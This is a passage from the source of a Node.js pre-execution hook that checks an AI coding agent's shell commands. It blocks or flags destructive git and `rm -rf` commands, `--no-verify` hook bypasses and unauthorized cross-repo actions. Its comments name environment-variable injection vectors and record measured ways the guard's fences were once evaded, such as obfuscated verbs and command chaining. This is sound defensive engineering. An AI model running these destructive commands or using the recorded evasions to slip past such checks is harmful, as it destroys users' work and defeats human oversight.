#!/usr/bin/env node
/**
 * @hook-event: PreToolUse:Bash (guard) — the proposed shell command and current repository state can be checked before execution.
 *
 * Hook: validate-bash-command
 * Event: PreToolUse
 * Matcher: Bash
 * Purpose: Block dangerous commands, suggest tmux for long-running,
 *          ENFORCE .env loading for pytest/python commands
 *
 * Framework-agnostic — works with any Kailash project.
 *
 * Exit Codes:
 *   0 = success (continue)
 *   2 = blocking error (stop tool execution)
 *   other = non-blocking error (warn and continue)
 */

const fs = require("fs");
const path = require("path");
const {
  logObservation: logLearningObservation,
} = require("./lib/learning-utils");
const { instructAndWait } = require("./lib/instruct-and-wait");
const {
  detectStateFileMutationSegmentAware,
  detectGitConfigMutation,
  detectRepoScopeDriftBash,
  detectWorktreeStaleBaseRef,
  // Quote-aware segmentation + doc-carrier payload masking. Already exported and
  // already used by the state-path lane; reused here rather than re-derived, so
  // the two lanes cannot drift on what counts as prose (security.md
  // § Enforcement-Surface Parity).
  splitShellSegments,
  maskDocCarrierPayloads,
  // Heredoc BODIES are prose too — `cat > notes.md <<'EOF' … EOF` writes a file,
  // which no argument-masking pass covers.
  parseHeredocSpans,
  // loom#1681 — the ONE protected-path spelling predicate. The severity router
  // below asks the same question the detector does and must ask it the same way.
  scopedPathHit,
} = require("./lib/violation-patterns");
// THE shared guard-git allowlist (loom#1462) — absolute binary + an env built
// from constants, so no ambient `GIT_DIR` can re-point a guard's git at another
// repository. Already required by guard-path-scope.js and coordination-mode.js.
const {
  resolveGitBinary,
  gitEnv,
  windowsHostEnv,
} = require("./lib/git-subprocess-env.js");
// T5 — the closed-literal-enum PCF category read for `gh pr create`. The enum
// lives in ONE module so the hook, the tests and any future consumer cannot
// drift on what the three valid values are (security.md § Multi-Site Kwarg
// Plumbing, the same one-parser rationale git-command-parse.js was extracted on).
const {
  classifyPrCreate,
  formatCategoryAdvisory,
} = require("./lib/pcf-category.js");
// T4 — CI-cost contract REACHABILITY. `ci-cost-discipline.md` is path-scoped, and a
// `git push` touches no file, so no `paths:` glob can inject it at the moment it
// governs. Delivered here instead, from the same hook and the same command as the PCF
// read above: "packing more into PRs" and "aligned with PCF triaging" are one decision,
// so they are now one code path rather than two artifacts that never meet.
const {
  classifyCiSpend,
  formatReachAdvisory,
  alreadyDelivered,
  recordDelivered,
} = require("./lib/ci-cost-reach.js");
// The UNSCOPED-TEST-RUN advisory. Lives in lib/ for the same reason the stash
// predicate below does: the classification is pure over the command string and is
// exercisable at a known-answer case without standing up this hook's stdin
// (instrument-discipline.md MUST-3(a)). It returns a STRING, never a
// `deferredFindings` entry — see the composition site below for why that is
// load-bearing rather than stylistic.
const { buildTestScopeAdvisory } = require("./lib/test-scope-advisory.js");
// worktree-isolation.md Rule 9 Phase-2 — the shared-stash predicate. Lives in
// lib/ (not inline) so the mutating-vs-read-only split is ONE lineage and is
// exercisable at a known-answer case without standing up this hook's stdin
// (instrument-discipline.md MUST-3(a)).
const {
  selectStashHazard,
  countWorkingTrees,
  countStashEntries,
} = require("./lib/stash-collision.js");
const { isGovernanceEnabled } = require("./lib/coordination-mode");
const { resolveMainCheckout } = require("./lib/state-resolver");
// loom#1703 residual (k) — the PATH-IDENTITY oracle. Turns "the command CONTAINS
// the spelling of a protected path" into "the resolved target IS protected
// state", so a throwaway `$(mktemp -d)/.claude/learning/…` sandbox stops
// blocking while a symlink escaping INTO the live tree starts blocking.
const {
  createStateTargetScope,
  SCOPE,
} = require("./lib/state-target-scope.js");
/**
 * Environment for a NODE child this hook spawns (loom#1471 shard 6).
 *
 * Built from constants, same discipline as `gitEnv()`: nothing is inherited, so
 * `NODE_OPTIONS` (which can `--require` an arbitrary module into the child) and
 * `NODE_PATH` cannot reach it regardless of what the settings layer does.
 *
 * `COC_RUNTIME` is the one pass-through. It is the harness's runtime selector,
 * legitimately set by the CLI wrapper, and dropping it would change which
 * runtime the child believes it is under — a behaviour change, not a hardening.
 * It is additionally covered by the settings-layer blanket `COC_` prefix deny,
 * so the attacker-delivery path for it is fenced one layer up.
 */
function nodeChildEnv() {
  const env = { PATH: "/usr/bin:/bin", LC_ALL: "C" };
  if (typeof process.env.COC_RUNTIME === "string") {
    env.COC_RUNTIME = process.env.COC_RUNTIME;
  }
  // loom#1471 (s49). The win32 half comes from the SHARED `windowsHostEnv()`,
  // the same function `gitEnv()` and `template-resolver.js::_shimEnv` use.
  //
  // This block used to be a local copy, and it had fallen BEHIND `gitEnv()` on
  // exactly the two dimensions `gitEnv()` was hardened on and this copy was not:
  // it validated the ambient `SystemRoot` with `path.isAbsolute` alone (which
  // admits `C:\attacker\stage` and the UNC `\\evil\share`), and it FORWARDED
  // `COMSPEC` and `PATHEXT` verbatim. Both are COMMANDS — `COMSPEC` names the
  // interpreter, `PATHEXT` decides which extensions are executable — so a
  // forwarded `COMSPEC` is a command-execution vector for any child that shells
  // out. They are now derived and constant respectively.
  //
  // That divergence is the reason this is a shared call and not a corrected
  // copy: `rules/security.md` § Enforcement-Surface Parity — a control promoted
  // at one surface must be learned by every independent surface, through ONE
  // shared function, or the surfaces drift again the next time one is hardened.
  Object.assign(env, windowsHostEnv());
  return env;
}
// loom#1422 — the THREE Bash-lane protected-path matchers are BUILT from the
// single registry in lib/guard-path-scope.js. They used to be three hand-kept
// regex literals here, and the case-insensitivity dimension had to be added to
// each one separately (plus ~7 more sites in three other hooks) — which is
// exactly the enumeration nobody produced and everybody missed. The rationale
// for each path's membership + severity class stays below, next to the code
// that routes it; only the PATTERN moved.
const {
  STATE_PATH_RX,
  LAYER3_BLOCK_RX,
  COORD_MODE_RX,
} = require("./lib/guard-path-scope.js");

// Timeout handling for PreToolUse hooks (5 second limit)
const TIMEOUT_MS = 5000;
let timeout = null;

// hookMain — the ONE entry, run by the CLI guard at the bottom of this file AND
// in-process by lib/hook-engine.js (dispatch.js). Everything a standalone run
// did at load time happens here instead, so a require() has no side effects.
function hookMain() {
  timeout = setTimeout(() => {
    console.error("[HOOK TIMEOUT] validate-bash-command exceeded 5s limit");
    console.log(JSON.stringify({ continue: true }));
    process.exit(1);
  }, TIMEOUT_MS);
  return new Promise((resolve, reject) => {
    let input = "";
    process.stdin.setEncoding("utf8");
    process.stdin.on("data", (chunk) => (input += chunk));
    process.stdin.on("end", () => {
      try {
        onStdinEnd(input);
      } catch (e) {
        return reject(e);
      }
      resolve();
    });
  });
}

function onStdinEnd(input) {
  clearTimeout(timeout);
  try {
    const data = JSON.parse(input);
    const result = validateBashCommand(data);
    // If result is structured for instruct-and-wait, use canonical shape
    if (result.severity) {
      const out = instructAndWait({
        hookEvent: "PreToolUse",
        severity: result.severity,
        what_happened: result.what_happened,
        why: result.why,
        agent_must_report: result.agent_must_report,
        agent_must_wait: result.agent_must_wait,
        user_summary: result.user_summary,
      });
      console.log(JSON.stringify(out.json));
      process.exit(out.exitCode);
    }
    // Legacy advisory path. Non-blocking advisories reach the agent via
    // additionalContext — the delivered PreToolUse field; the prior
    // `validation` sibling was silently dropped (loom #466). Emit the context
    // block only when there's an advisory message.
    const advisory = { continue: result.continue };
    if (result.message) {
      advisory.hookSpecificOutput = {
        hookEventName: "PreToolUse",
        additionalContext: result.message,
      };
    }
    console.log(JSON.stringify(advisory));
    process.exit(result.exitCode);
  } catch (error) {
    console.error(`[HOOK ERROR] ${error.message}`);
    console.log(JSON.stringify({ continue: true }));
    process.exit(1);
  }
}

// loom#1549 F3 — the git-invocation parser moved to lib/git-command-parse.js.
// It used to live HERE and nowhere else, so the pairing guard
// (fold-amendment-paired-with-helper.js) grew its own `/\bcommit\b/` lineage
// instead of reusing it — the divergence kailash-rs rejected the Gate-2 sync
// over. One parser, every consumer, per security.md § Multi-Site Kwarg
// Plumbing; same shape as tool-classes.js for tool names.
const {
  parseGitInvocation,
  parseGitInvocations,
  stripShellComments,
  stripShellGroupDelimiters,
  expandNestedSegments,
} = require(path.join(__dirname, "lib", "git-command-parse.js"));

// loom s60 — the destructive-FORCE target predicate. `git worktree remove
// --force` and `rm -rf <dir>` destroy a whole tree, and a bare
// `git worktree remove` REFUSES a dirty tree — that refusal IS the safety
// mechanism `--force` exists to defeat (worktree-isolation.md Rule 8). Kept in
// ONE module with the `rm -rf` half rather than a second lineage, per
// security.md § Enforcement-Surface Parity.
const {
  STATE: FORCE_STATE,
  DANGER: FORCE_DANGER,
  selectWorktreeRemoveForce,
  selectRmForce,
  resolveTargetPath,
  assessTarget,
  classifyPathDanger,
} = require(path.join(__dirname, "lib", "destructive-force-target.js"));

/**
 * The ONE commit-detection predicate for this hook (loom#1549 HIGH-3).
 *
 * Three sites each carried their own `git commit` regex — two `^`-anchored and
 * one `\b`-anchored — which is the same multi-lineage drift this whole issue is
 * about, reproduced INSIDE the file the shared parser was extracted from. The
 * `^` form was blind to `cd sub && git commit`, `git -C /repo commit`, `sudo git
 * commit`, and `env VAR=x git commit`; the `\b` form fired on `git log
 * --grep=commit`. Dispatching on the parsed SUBCOMMAND POSITION is the only
 * thing that separates those structurally.
 *
 * Returns the invocation (carrying `.dir` and `.unresolvable`) or null, so a
 * caller that needs the retargeted repository can have it rather than assuming
 * the session cwd.
 *
 * @param {string} command
 * @returns {{sub:string,dir:string|null,args:string,unresolvable:string|null}|null}
 */
function findCommitInvocation(command) {
  return parseGitInvocations(command).find((g) => g.sub === "commit") || null;
}

/**
 * The ONE push-detection predicate for this hook (loom#1715 same-class fold-in).
 *
 * Same shape and same rationale as `findCommitInvocation` above, one verb over.
 * The security-review reminder below was the last site in this file still
 * substring-matching `/git\s+push/` against the RAW command, so it fired on
 * `git push` appearing as DATA — inside a JS string, a quoted argument, a
 * heredoc body or a comment — which is loom#1714 MEDIUM-1's class exactly, and
 * was reproduced live on a `node -e` probe during the loom#1715 review.
 *
 * @param {string} command
 * @returns {{sub:string,dir:string|null,args:string,argv:string[],unresolvable:string|null}|null}
 */
function findPushInvocation(command) {
  return parseGitInvocations(command).find((g) => g.sub === "push") || null;
}

// ---------------------------------------------------------------------------
// `--no-verify` — the HOOK-BYPASS predicate, keyed on ARGV POSITION.
//
// The fence below used to be pure TOKEN PRESENCE against the raw segment text:
// `segments.some((s) => /(?:^|\s)--no-verify\b/.test(s.trim()))`. That matched
// the characters wherever they sat — in quoted prose, as a search pattern, as
// the operand of a command that has no hooks at all. MEASURED before this fix,
// every one of these returned HALT-AND-REPORT and every one is a FALSE POSITIVE:
//
//   echo "we used --no-verify once"         (prose inside a quoted string)
//   echo --no-verify                        (operand of a command with no hooks)
//   grep -rn -- --no-verify .claude/hooks   (the token as a SEARCH PATTERN)
//   git log --grep 'skip --no-verify here'  (the token inside a --grep argument)
//   cat /tmp/m.txt | grep -c ' --no-verify '
//
// This is loom#1714 MEDIUM-1's class — the same defect `findPushInvocation`
// above records for `/git\s+push/` ("fired on `git push` appearing as DATA").
// The remedy is the same one, and the instrument already exists in this tree:
// `parseGitInvocation`'s `argv`, which is documented at git-command-parse.js
// as "the post-subcommand words as TOKENS, not a joined string", authored so a
// caller "has to tell a real `--dry-run` FLAG from the same characters sitting
// inside a `-m` message body". Extending the regex with more lookarounds would
// have been the symptom patch; this keys on POSITION instead.
//
// The severity is UNCHANGED at `halt-and-report`. Moving the signal from lexical
// to structural (a parsed argv slot) makes it block-ELIGIBLE under
// hook-output-discipline.md MUST-2, and it is deliberately NOT escalated: the
// harm is a skipped local hook, recoverable by re-running it, and this change's
// mandate is precision, never new teeth.

/**
 * Git subcommands for which `--no-verify` is a real flag that really bypasses a
 * hook. MEASURED against git 2.54.0 (Apple Git-157) rather than recalled — the
 * probe ran `git <sub> --no-verify zzz-no-such-ref` and read whether git named
 * `no-verify` in an `unknown option` line, with `--zzz-not-a-flag` as the
 * control pole on every row:
 *
 *   TAKEN      commit, push, merge, rebase, am, pull
 *   NOT TAKEN  tag, stash, worktree         (control agreed: both poles named)
 *   UNMEASURED cherry-pick, revert          (they resolve the revision BEFORE
 *              reporting an unknown option, so the control read TAKEN too —
 *              a non-discriminating row, not evidence of acceptance)
 *
 * The line is drawn on WHAT THE MEASUREMENT SAID, not on a blanket
 * fail-closed instinct, and the two halves are consistent rather than opposed:
 *
 *   measured NOT-TAKEN  -> QUIET. `git tag --no-verify` and `git stash
 *     --no-verify` bypass NOTHING: git rejects the flag and the command fails on
 *     its own. Firing there is a false positive of exactly the class this fix
 *     removes — a fence speaking outside its subject teaches the session to skim
 *     its output, and the cost is paid on the next REAL `git commit
 *     --no-verify`. An earlier revision listed `tag` anyway "because omitting a
 *     verb some other git accepts would be a bypass"; that rested on a
 *     version-skew claim with NO evidence behind it, while `stash` — the same
 *     measurement, the same verdict — was left quiet. Two opposite readings of
 *     one measurement, so the unsupported one went.
 *   UNMEASURED          -> FENCED. For `cherry-pick` and `revert` acceptance is
 *     UNKNOWN, not known-negative, and an unknown resolves to the fail-closed
 *     side: over-listing costs one advisory on a command that fails anyway,
 *     omitting costs a silent hook bypass.
 *
 * An unresolvable VERB is a third case and is handled in `carriesNoVerifyFlag`,
 * not here.
 */
const NO_VERIFY_SUBCOMMANDS = new Set([
  // MEASURED-TAKEN
  "commit",
  "push",
  "merge",
  "rebase",
  "am",
  "pull",
  // UNMEASURED — listed on the fail-closed argument above, NOT on a measurement
  "cherry-pick",
  "revert",
]);

/**
 * SEPARATED flags that unconditionally CONSUME the next shell word, per
 * subcommand. Without this, `git commit -m "--no-verify"` reads its own commit
 * MESSAGE as a flag and halts a session that bypassed nothing.
 *
 * MEASURED, not copied. `posture-gate.js::VALUE_FLAGS` carries a hand-written
 * table for the same job and three of its entries are wrong in the DANGEROUS
 * direction — `commit -S`/`--gpg-sign`, `push --force-with-lease` and
 * `push --signed` are OPTIONAL-value flags whose separated form consumes
 * NOTHING. Copying them would make this walk skip the very next token, so
 * `git push --force-with-lease --no-verify origin main` would have gone SILENT:
 * a bypass introduced by the fix meant to close one. Each row here was probed
 * with `git <sub> <flag> --zzz-not-a-flag` — if git names `zzz-not-a-flag` as an
 * unknown option the flag consumed nothing — against known-boolean control poles
 * (`--quiet`, `--amend`, `--abort`, …) on every subcommand.
 *
 * The fail direction is deliberate and one-way: a MISSING entry can only make
 * the fence read a value as a flag and OVER-fire (noisy, safe), while a WRONG
 * entry makes it skip a real flag and UNDER-fire (a bypass). So when a flag's
 * separated form measured NOT-CONSUMING it is left out, always.
 */
const NO_VERIFY_VALUE_FLAGS = {
  commit: new Set([
    "-m",
    "--message",
    "-F",
    "--file",
    "-c",
    "--reedit-message",
    "-C",
    "--reuse-message",
    "--author",
    "--date",
    "--cleanup",
    "--fixup",
    "--squash",
    "-t",
    "--template",
    "--trailer",
    "--pathspec-from-file",
  ]),
  push: new Set([
    "--repo",
    "--receive-pack",
    "--exec",
    "-o",
    "--push-option",
    "--recurse-submodules",
  ]),
  merge: new Set([
    "-m",
    "--message",
    "-F",
    "--file",
    "-s",
    "--strategy",
    "-X",
    "--strategy-option",
    "--into-name",
    "--cleanup",
  ]),
  rebase: new Set([
    "--onto",
    "-x",
    "--exec",
    "-s",
    "--strategy",
    "-X",
    "--strategy-option",
    "-C",
    "--whitespace",
  ]),
  am: new Set([
    "--exclude",
    "--include",
    "--patch-format",
    "--whitespace",
    "-C",
    "-p",
    "--directory",
    "--resolvemsg",
  ]),
  pull: new Set([
    "-s",
    "--strategy",
    "-X",
    "--strategy-option",
    "--depth",
    "-o",
    "--upload-pack",
  ]),
  // No `tag` entry: `tag` measured NOT-TAKEN and is therefore not in
  // NO_VERIFY_SUBCOMMANDS, so a value-flag table for it would be unreachable —
  // dead data that reads as coverage.
};

/**
 * Does this parsed git invocation carry `--no-verify` in a real ARGV FLAG
 * position, on a subcommand that actually takes it?
 *
 * Fails CLOSED on an unresolvable VERB, in BOTH the shapes the parser produces
 * for one — because they differ in whether argv survives, and a check that only
 * covered the survivable one would go quiet on the other:
 *
 *   `git $(echo commit) --no-verify`  -> sub is the opaque word, argv INTACT
 *   `git$IFS commit --no-verify`      -> the fused-token branch returns argv []
 *
 * The hidden verb could be any of the fenced ones, so the flag counts either
 * way: argv is walked with NO value-flag table (there is no known subcommand to
 * key one on, and skipping nothing can only over-fire), and the RAW segment is
 * scanned as well. The raw scan is the predicate this whole change replaced, and
 * it is sound HERE precisely because it is unreachable from the false-positive
 * class: every measured FP (`echo …`, `grep …`, a heredoc body, a JSON payload)
 * makes `parseGitInvocation` return null, and a null never reaches this line. It
 * is reached only by a segment the parser has ALREADY identified as a git
 * invocation whose verb it cannot see.
 *
 * A segment that is not a git invocation at all returns null from the parser and
 * never reaches here.
 *
 * @param {{sub:string|null,argv?:string[],unresolvable:string|null}|null} g
 * @param {string} [segment] the raw segment text, for the fail-closed scan
 * @returns {boolean}
 */
function carriesNoVerifyFlag(g, segment) {
  if (!g) return false;
  const verbUnknown = g.unresolvable === "subcommand";
  const fenced =
    verbUnknown ||
    (typeof g.sub === "string" && NO_VERIFY_SUBCOMMANDS.has(g.sub));
  if (!fenced) return false;
  const argv = Array.isArray(g.argv) ? g.argv : [];
  const valueFlags = verbUnknown ? null : NO_VERIFY_VALUE_FLAGS[g.sub];
  for (let i = 0; i < argv.length; i++) {
    const t = argv[i];
    if (typeof t !== "string") continue;
    // Everything after `--` is a pathspec, never a flag: `git commit -m x --
    // --no-verify` stages a FILE of that name and bypasses nothing.
    if (t === "--") return false;
    if (valueFlags && valueFlags.has(t)) {
      i += 1; // consume this flag's value so it is never read as a flag itself
      continue;
    }
    if (t === "--no-verify") return true;
  }
  // Fail-closed tail for the unresolvable verb: argv may be empty (the fused
  // `git$IFS` branch) or may exclude words a substitution swallowed, so the
  // segment text is the last thing that can still carry the flag. Quoted forms
  // are covered by the argv walk above, which sees tokens already dequoted.
  if (verbUnknown) return /(?:^|\s)--no-verify\b/.test(String(segment || ""));
  return false;
}

/**
 * Structural working-tree signal — the canonical example hook-output-
 * discipline.md MUST-2 names as the basis for `severity: "block"` ("git
 * status --porcelain non-empty before --hard"). Runs in the `-C` target dir
 * (or the session cwd). Returns { ok, dirty, untracked }; ok=false means git
 * could not be queried (not a repo, timeout) — the caller fails OPEN to
 * halt-and-report rather than hard-blocking on an unverifiable signal (the
 * MUST-2 anti-false-positive default).
 */
function gitWorkingTreeStatus(dir, cwd) {
  try {
    const { spawnSync } = require("child_process");
    // THE shared guard-git allowlist (loom#1462). This spawn pre-dates that
    // module and was still passing a bare binary name with NO `env:`, which is
    // exactly the defect the module exists for: `GIT_DIR` outranks repository
    // DISCOVERY, so neither `-C` nor `cwd:` pins WHICH repository answers.
    //
    // IT MATTERS MOST HERE, of every git a guard spawns in this repo. This
    // function's two consumers (`validate-bash-command.js:1972-2042` — `git
    // reset --hard` and `git clean -f`) are two of the SIX `severity: "block"`
    // branches in this file (`validate-bash-command.js:1302`, `:1492`, `:1562`,
    // `:1864`, `:1972`, `:2042`); an earlier revision of this comment called
    // them the ONLY two, which was false on its own tree and is corrected here
    // per `zero-tolerance.md` Rule 3e. It still matters most here because the
    // failure is
    // fail-OPEN: an ambient `GIT_DIR` pointing at a CLEAN repo yields
    // `{ok:true, dirty:false}`, the block does not fire, and the destructive
    // command proceeds against the real dirty tree — irrecoverable, no reflog.
    //
    // Swept in with the ref-probe routing per security.md § Enforcement-Surface
    // Parity rather than left a version behind; `zero-tolerance.md` Rule 1a
    // forbids the "same on main, so not introduced here" disposition. The
    // ACCEPTED-RESIDUAL note at the ref probe used to cite THIS call as its
    // safety baseline, which was citing the weaker surface — that note now says
    // so explicitly.
    const gitBin = resolveGitBinary();
    // Unresolvable git ranks TIGHTEST here, per that module's caller contract:
    // this is a fail-closed destructive-op fence, NOT the advisory lane, so the
    // named deviation recorded at the ref probe does NOT transfer. `ok:false`
    // already routes the caller to halt-and-report rather than silent allow.
    if (!gitBin) return { ok: false, dirty: false, untracked: false };
    const r = spawnSync(
      gitBin,
      [
        "-C",
        dir || cwd || ".",
        "status",
        "--porcelain",
        "--untracked-files=all",
      ],
      {
        encoding: "utf8",
        timeout: 2500,
        stdio: ["ignore", "pipe", "ignore"],
        env: gitEnv(),
      },
    );
    if (r.status !== 0 || typeof r.stdout !== "string") {
      return { ok: false, dirty: false, untracked: false };
    }
    const lines = r.stdout.split("\n").filter(Boolean);
    return {
      ok: true,
      dirty: lines.length > 0,
      untracked: lines.some((l) => l.startsWith("??")),
    };
  } catch {
    return { ok: false, dirty: false, untracked: false };
  }
}

function validateBashCommand(data) {
  const command = data.tool_input?.command;
  const cwd = data.cwd || process.cwd();

  // loom#1606 instances 4-8 — the SEVERITY-ORDERING deferral, same shape as the
  // `deferredScopeAdvisory` fix below but for the five topic branches that
  // return the full instructAndWait FINDING rather than a bare message.
  //
  // This function is FIRST-MATCH-WINS ordered by TOPIC, not by SEVERITY, so
  // every non-`block` return suppresses every `block` fence beneath it — and
  // `halt-and-report` is NOT blocking (instruct-and-wait.js:147 returns
  // `continue:true` for every non-block severity, so the tool call RUNS). That
  // is why six of the seven instances read as harmless to every prior reviewer:
  // the code says "halt", the runtime does not halt.
  //
  // Declared at the function head rather than beside the first deferral site,
  // because the earliest of the five (the cross-repo ceremony, immediately
  // below) sits ABOVE the `deferredScopeAdvisory` declaration.
  const deferredFindings = [];

  // Merge every deferred finding into whichever result the function finally
  // reaches. EVERY `return` downstream of the first deferral site routes
  // through this — not just the non-blocking ones — or the finding is silently
  // destroyed, which is the dead-code defect the Tier-1 adversarial review
  // caught on the first three fixes (see withScopeAdvisory below).
  //
  // Severity is the MAX of {deferred, result}: a `block` below always wins and
  // is never weakened, and a deferred `halt-and-report` is never downgraded to
  // a bare advisory. A legacy `{continue:true, message}` result carries no
  // severity, so its message rides out as a trailing report line rather than
  // being dropped when a finding is pending.
  //
  // loom#1715 H-1 — the ALL-PRE-ACTION carve-out. The collapse-to-
  // `halt-and-report` default renders the head "the action ALREADY RAN", which
  // is FALSE for every finding this hook emits: it is a PreToolUse hook, so
  // nothing has run when it speaks. The carve-out is deliberately the NARROWEST
  // that fixes the measured case — it fires only when EVERY finding in the merge
  // is `pre-action`, so any pre-existing combination (which contains no
  // `pre-action` finding at all) still collapses to `halt-and-report` and every
  // existing head renders byte-identically. That is measured, not assumed:
  // ci-cost-reach.test.mjs pins the cross-repo finding's rendered head against a
  // snapshot taken before this change.
  //
  // THE RESIDUAL IS STATED, AND IT IS NOT HYPOTHETICAL — it was MEASURED on the
  // second of the two commands this surface targets:
  //   git push origin HEAD  -> "NOT BLOCKED — the action has NOT run yet..."  (fixed)
  //   gh pr create ...      -> "NOT BLOCKED — the action ALREADY RAN..."      (residual)
  // `gh pr create` ALWAYS co-fires the PCF-category finding above, which is
  // registered `halt-and-report`, so the merge collapses and the CI-cost
  // delivery inherits the false head on that path. Every other deferred finding
  // in this PreToolUse hook carries the same mis-registration — nothing has run
  // when this hook speaks — so the general repair is to re-register them, and
  // that is deliberately NOT done here: those findings ship from other lanes
  // (the PCF block is at origin/main, from T5), and silently changing another
  // lane's delivered head is a wider blast radius than this fix is scoped to
  // carry. Recorded so the next session inherits the measurement, not a
  // surprise.
  const withDeferred = (result) => {
    if (deferredFindings.length === 0) return result;
    const all = result.severity
      ? [...deferredFindings, result]
      : [...deferredFindings];
    const merged = {
      severity: all.some((f) => f.severity === "block")
        ? "block"
        : all.every((f) => f.severity === "pre-action")
          ? "pre-action"
          : "halt-and-report",
      what_happened: all.map((f) => f.what_happened).join("\n\n"),
      why: all.map((f) => f.why).join("\n\n"),
      agent_must_report: all.flatMap((f) => f.agent_must_report || []),
      agent_must_wait: all.map((f) => f.agent_must_wait).join(" "),
      user_summary: all.map((f) => f.user_summary).join(" | "),
    };
    if (!result.severity && result.message) {
      merged.agent_must_report = [...merged.agent_must_report, result.message];
    }
    return merged;
  };

  // F1 ROOT — a shell call with NO readable command string is not an empty
  // line. The `|| ""` fall-through evaluated an absent or non-string command
  // as "", so every fence below judged the EMPTY string and let the call
  // through (MEASURED pathway: a native `cmd`-carrying payload evaluated ""
  // while the host still had a command to run). Refuse through the same
  // PRE-ACTION merge every other finding uses — nothing has run when this
  // PreToolUse hook speaks.
  if (typeof command !== "string") {
    return withDeferred({
      severity: "block",
      what_happened: "Bash validation received no command string (tool_input.command is absent or not a string); refusing to evaluate an absent command as an empty line.",
      why: "validate-bash-command — the `|| \"\"` fall-through rendered an unreadable command as \"\", so every fence above evaluated an empty line and allowed the call. A command this hook cannot read is not a command it may allow.",
      agent_must_report: ["Report the payload shape that carried no string command (tool name and which tool_input fields were present)."],
      agent_must_wait: "Do not retry the same payload shape; the caller must supply tool_input.command as a string.",
      user_summary: "bash validation blocked: no command string in the payload",
    });
  }

  // GUIDE-FIRST cross-repo ceremony (B — journal/0488 RC1+RC3). This is the
  // PreToolUse Bash tripwire, so the guidance arrives BEFORE the cross-repo
  // command runs — the agent can honor the halt and run /cross-repo-authorize
  // instead of contaminating framing with a cross-repo read (vs the PostToolUse
  // advisory in detect-violations.js, which fires only AFTER). Hosted here (not
  // detect-violations.js) because this hook is already the mcp-guard Bash
  // tripwire — so the ceremony is CLI-neutral (mirrors to Codex shell) without
  // reclassifying the CC-only multi-event detect-violations.js. GUIDES, does not
  // block — lexical detection → halt-and-report (hook-output-discipline.md
  // MUST-2). The authoritative violation ROW is logged once, by the PostToolUse
  // detect-violations.js branch (no double-count). detectRepoScopeDriftBash
  // returns null when a same-tier authorizing receipt exists → authorized
  // re-runs pass straight through.
  const crossRepo = detectRepoScopeDriftBash(command, cwd);
  if (crossRepo) {
    const target = crossRepo.target || "<owner/repo>";
    const intent = crossRepo.intent || "write";
    const isRead = intent === "read";
    // loom#1606 instance 4 — DEFER, never return. `detectRepoScopeDriftBash` is
    // segment-anchored, so `gh issue list --repo other/repo && git reset --hard`
    // fired on segment 1 and returned here, and EVERY fence below — the
    // state-file block, the coordination block, both irrecoverable git fences —
    // never ran. MEASURED with a control on a dirty tree:
    //   git reset --hard HEAD                     (alone)  -> exit 2 BLOCK
    //   gh issue list --repo other-org/other-repo && <same> -> exit 0 ALLOW
    //
    // This one carries a PERVERSE INVERSION: the detector returns null when a
    // `.claude/cross-repo-authz/` receipt exists, so an AUTHORIZED cross-repo
    // command fell through and got fenced normally while an UNAUTHORIZED one
    // short-circuited and disabled the fence — the less legitimate the command,
    // the weaker the enforcement.
    deferredFindings.push({
      severity: "halt-and-report",
      what_happened: `Cross-repo ${intent} against ${target} attempted with no authorizing receipt (repo-scope-discipline.md § User-Authorized Exception).`,
      why: crossRepo.rule_id,
      agent_must_report: [
        `This is a cross-repo ${intent.toUpperCase()}. Do NOT self-authorize it — the agent never self-authorizes (repo-scope-discipline.md MUST-NOT).`,
        `Run the ceremony: /cross-repo-authorize ${target} "<the exact bounded action>" — it restates action+target for your yes/no, then writes the receipt so no condition is dropped.`,
        isRead
          ? `READ tier (D): conditions 1+2+3+5 apply; condition 4 is a one-line affordance receipt (still required) — the affordance writes it to .claude/cross-repo-authz/.`
          : `WRITE tier: ALL FIVE conditions apply — the affordance writes the receipt (verbatim user instruction + the cross-repo-authorized marker) to .claude/cross-repo-authz/ BEFORE the action runs.`,
        `The receipt is the ONLY distinguisher between an authorized and unauthorized cross-repo action (absent = critical L1, trust-posture.md MUST-4). Once written, re-run this command — the receipt clears the gate.`,
      ],
      agent_must_wait:
        "Do not run the cross-repo command until /cross-repo-authorize has written the receipt (or the user explicitly redirects).",
      user_summary: `${crossRepo.rule_id} — cross-repo ${intent} ${target}: run /cross-repo-authorize first`,
    });
  }

  // PCF CATEGORY on `gh pr create` (T5). `product-completion-first.md` MUST-1
  // requires every gate-surfaced finding to carry a category; measured
  // 2026-08-14 that category was UNOBSERVABLE on a PR — 0 of the last 40 PRs
  // carried any label and 0 of the last 30 bodies any category field, so no
  // instrument could return either verdict. This is the read.
  //
  // Hosted here rather than in a new hook file because this hook is ALREADY
  // the PreToolUse Bash tripwire with a `hook_delivery` lane, a settings.json
  // registration and a Codex shell mirror — a second registration would buy
  // nothing and cost a fourth surface to keep in parity.
  //
  // DEFERRED, never returned: `detectRepoScopeDriftBash` above is
  // segment-anchored, and the loom#1606 lesson is that a `return` here would
  // suppress every fence below it. halt-and-report, never `block`: the verdict
  // is a lexical read of a command string, which hook-output-discipline.md
  // MUST-2 bars from carrying block severity — and whether a change is a BUG
  // or an INCREMENTAL is judgment-bearing besides.
  //
  // SILENT on CATEGORIZED. A hook that speaks on every PR teaches the agent to
  // ignore it, which is the NON-DISCRIMINATION failure mode that made
  // `wrapup-after-landing.js` dismissible — not a frequency problem.
  const pcf = classifyPrCreate(command, { repoRoot: cwd });
  const pcfAdvisory = formatCategoryAdvisory(pcf);
  if (pcfAdvisory) {
    deferredFindings.push({
      severity: "halt-and-report",
      what_happened: `\`gh pr create\` was invoked and the PR carries no readable Product-Completion-First category (state: ${pcf.state}, cause: ${pcf.cause}).`,
      why: "product-completion-first.md MUST-1",
      agent_must_report: [
        pcfAdvisory,
        `State is ${pcf.state}, cause ${pcf.cause}, body source ${pcf.source} — NOT "clean" and NOT a boolean false. UNCATEGORIZED means the body was read and carries no field; NOT_VERIFIED means the body could not be read at all, so the category is UNKNOWN and this verdict is about the INSTRUMENT, not about the PR.`,
        // loom#1803 — the CAUSE-KEYED remedy is carried INSIDE the advisory
        // above (`formatCategoryRemediation`, composed by
        // `formatCategoryAdvisory`), so it is NOT repeated as a bullet here.
        // The static line that used to sit here — "re-issue the command with
        // the field in the body" — was written for UNCATEGORIZED and was
        // actively harmful on NOT_VERIFIED: re-issuing a create whose PR
        // already exists opens a DUPLICATE, and in all three measured
        // instances the published body was already correct.
        "The field is the durable record — a label is not, because it lives in GitHub's mutable remote registry rather than in the PR's own text.",
      ],
      agent_must_wait:
        pcf.state === "NOT_VERIFIED"
          ? "Report the CAUSE above and what you did about it. If the create already ran, read the published body before touching anything — do not open a second PR."
